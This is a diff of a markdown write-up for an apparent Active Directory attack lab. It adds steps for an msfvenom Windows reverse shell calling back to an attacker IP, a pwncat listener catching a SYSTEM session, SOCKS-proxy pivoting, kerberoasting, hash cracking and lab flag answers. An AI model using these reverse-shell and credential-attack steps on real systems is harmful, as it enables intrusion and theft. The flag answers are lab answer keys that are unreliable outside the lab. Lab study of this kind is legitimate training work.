@@ -1586,7 +1586,7 @@ Hash.Target......: $krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$notahacker/L...0733b0
 Time.Started.....: Fri Mar  3 05:38:03 2023 (7 secs)
 Time.Estimated...: Fri Mar  3 05:38:10 2023 (0 secs)
 Kernel.Feature...: Pure Kernel
-Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)source pwncat-env/bin/activate
 Guess.Queue......: 1/1 (100.00%)
 Speed.#1.........:  1575.4 kH/s (1.05ms) @ Accel:512 Loops:1 Thr:1 Vec:8
 Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
@@ -2436,7 +2436,7 @@ burn1ng_d0wn_th3_f0rest!
 
 ---
 ## AD Enumeration & Attacks - Skills Assessment Part I
-### Question:
+### Question 1:
 ![](./attachments/Pasted%20image%2020230308194528.png)
 
 Open the webshell at `/uploads/antak.aspx` and login.
@@ -2450,94 +2450,8 @@ JusT_g3tt1ng_st@rt3d!
 
 **Answer:** `JusT_g3tt1ng_st@rt3d!`
 
-### Question:
-![](./attachments/Pasted%20image%2020230308194538.png)
-
-```
-
-```
-
-**Answer:** ``
-
-### Question:
-![](./attachments/Pasted%20image%2020230308194547.png)
-
-```
-
-```
-
-**Answer:** ``
-
-### Question:
-![](./attachments/Pasted%20image%2020230308194606.png)
-
-```
-
-```
-
-**Answer:** ``
-
-### Question:
-![](./attachments/Pasted%20image%2020230308194617.png)
-
-```
-
-```
-
-**Answer:** ``
-
-### Question:
-![](./attachments/Pasted%20image%2020230308194627.png)
-
-```
-
-```
-
-**Answer:** ``
-
-### Question:
-![](./attachments/Pasted%20image%2020230308194639.png)
-
-```
-
-```
-
-**Answer:** ``
-
-### Question:
-![](./attachments/Pasted%20image%2020230308194647.png)
-
-```
-
-```
-
-**Answer:** ``
-
----
-## AD Enumeration & Attacks - Skills Assessment Part II
-### Question 1:
-![](./attachments/Pasted%20image%2020230309194135.png)
-
-Generate a userlist.
-
-```
-┌─[htb-student@skills-par01]─[~]
-└──╼ $kerbrute userenum -d inlanefreight.local --dc 172.16.7.3 /opt/jsmith.txt | grep @in | cut -f8 -d" " | cut -d '@' -f1  > validusers.txt
-┌─[htb-student@skills-par01]─[~]
-└──╼ $cat validusers.txt 
-jjones
-sbrown
-tjohnson
-(...)
-whouse
-emercer
-wshepherd
-```
-
-**Answer:** ``
-
 ### Question 2:
-![](./attachments/Pasted%20image%2020230309194144.png)
+![](./attachments/Pasted%20image%2020230308194538.png)
 
 Download `Rubeus.exe` from one of the other boxes using python uploadserver.
 
@@ -2588,8 +2502,7 @@ PS> C:\Rubeus.exe kerberoast /nowrap
 **Answer:** `svc_sql`
 
 ### Question 3:
-![](./attachments/Pasted%20image%2020230309194158.png)
-*Hint: Try various remote access methods.*
+![](./attachments/Pasted%20image%2020230308194547.png)
 
 Crack the hash with `hashcat`.
 
@@ -2634,7 +2547,83 @@ user:pass `svc_sql:lucky7`
 **Answer:** `lucky7`
 
 ### Question 4:
-![](./attachments/Pasted%20image%2020230309194328.png)
+![](./attachments/Pasted%20image%2020230308194606.png)
+
+Upload a reverse shell with `msfvenom`
+
+```
+┌──(kali㉿kali)-[~/HTB/ActiveDirectoryAttacks]
+└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.199 LPORT=443 -f exe > ReverseShell.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of exe file: 73802 bytes
+```
+
+Launch `pwncat-cs` and setup a listener.
+
+```
+┌──(kali㉿kali)-[~]
+└─$ source pwncat-env/bin/activate
+
+┌──(pwncat-env)─(kali㉿kali)-[~]
+└─$ pwncat-cs        
+/home/kali/pwncat-env/lib/python3.11/site-packages/paramiko/transport.py:178: CryptographyDeprecationWarning: Blowfish has been deprecated
+  'class': algorithms.Blowfish,
+[07:51:28] Welcome to pwncat 🐈!                                                                     __main__.py:164
+(local) pwncat$ listen --platform windows 443
+[08:10:08] new listener created for 0.0.0.0:443
+[08:37:53] 10.129.140.217:49738: dropping stage one in '\\Windows\\Tasks\\uVNZr1i5'                   manager.py:957
+[08:37:54] 10.129.140.217:49738: using install utils from .net v4.0.30319                             manager.py:957
+[08:37:55] 10.129.140.217:49738: loaded known host from db                                            manager.py:957
+           listener: 0.0.0.0:443: windows session from 10.129.140.217:49738 established               manager.py:957
+(local) pwncat$ sessions
+                                               Active Sessions                                                
+     ╷                     ╷                                      ╷          ╷        ╷                       
+  ID │ User                │ Host ID                              │ Platform │ Type   │ Address               
+ ════╪═════════════════════╪══════════════════════════════════════╪══════════╪════════╪══════════════════════ 
+  *1 │ NT AUTHORITY\SYSTEM │ ef202267-007f-42e1-8ebc-e35fc3e07732 │ windows  │ Socket │ 10.129.140.217:49738  
+     ╵                     ╵                                      ╵          ╵        ╵                      
+```
+
+Upload `Invoke-SocksProxy.psm1` from [SocksProxy](https://github.com/p3nt4/Invoke-SocksProxy).
+
+```
+(local) pwncat$ upload /home/kali/HTB/ActiveDirectoryAttacks/Invoke-SocksProxy/Invoke-SocksProxy.psm1
+./Invoke-SocksProxy.psm1 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 13.8/13.8 KB • ? • 0:00:00
+[08:15:53] uploaded 13.79KiB in 0.11 seconds
+```
+
+Press `Ctrl + D` to switch mode into the session and execute the `SocksProxy`.
+
+```
+(remote) WEB-WIN01$@WEB-WIN01:C:\windows\system32\inetsrv$ powershell
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\> Import-Module .\Invoke-SocksProxy.psm1
+Import-Module .\Invoke-SocksProxy.psm1
+PS C:\> Invoke-SocksProxy -bindPort 1082
+Invoke-SocksProxy -bindPort 1082
+Listening on port 1082...
+```
+
+Configure `/etc/proxychains.conf` with the target IP and listening port.
+
+```
+┌──(kali㉿kali)-[~]
+└─$ tail /etc/proxychains.conf
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+socks4 10.129.140.217 1082
+```
+
+
+
+#### Alternate method:
 
 Enable `RDP` using [this](https://exchangepedia.com/2016/10/enable-remote-desktop-rdp-connections-for-admins-on-windows-server-2016.html) guide.
 
@@ -2695,11 +2684,98 @@ RDP into the target box.
 **Answer:** `spn$_r0ast1ng_on_@n_0p3n_f1re`
 
 ### Question 5:
-![](./attachments/Pasted%20image%2020230309194337.png)
+![](./attachments/Pasted%20image%2020230308194617.png)
 
 ![](./attachments/Pasted%20image%2020230310121553.png)
 
 **Answer:** `tpetty`
+
+### Question 6:
+![](./attachments/Pasted%20image%2020230308194627.png)
+
+```
+
+```
+
+**Answer:** ``
+
+### Question 7:
+![](./attachments/Pasted%20image%2020230308194639.png)
+
+```
+
+```
+
+**Answer:** ``
+
+### Question 8:
+![](./attachments/Pasted%20image%2020230308194647.png)
+
+```
+
+```
+
+**Answer:** ``
+
+---
+## AD Enumeration & Attacks - Skills Assessment Part II
+### Question 1:
+![](./attachments/Pasted%20image%2020230309194135.png)
+
+Generate a userlist.
+
+```
+┌─[htb-student@skills-par01]─[~]
+└──╼ $kerbrute userenum -d inlanefreight.local --dc 172.16.7.3 /opt/jsmith.txt | grep @in | cut -f8 -d" " | cut -d '@' -f1  > validusers.txt
+┌─[htb-student@skills-par01]─[~]
+└──╼ $cat validusers.txt 
+jjones
+sbrown
+tjohnson
+(...)
+whouse
+emercer
+wshepherd
+```
+
+**Answer:** ``
+
+### Question 2:
+![](./attachments/Pasted%20image%2020230309194144.png)
+
+```
+
+```
+
+**Answer:** ``
+
+### Question 3:
+![](./attachments/Pasted%20image%2020230309194158.png)
+*Hint: Try various remote access methods.*
+
+```
+
+```
+
+**Answer:** ``
+
+### Question 4:
+![](./attachments/Pasted%20image%2020230309194328.png)
+
+```
+
+```
+
+**Answer:** ``
+
+### Question 5:
+![](./attachments/Pasted%20image%2020230309194337.png)
+
+```
+
+```
+
+**Answer:** ``
 
 ### Question 6:
 ![](./attachments/Pasted%20image%2020230309194350.png)
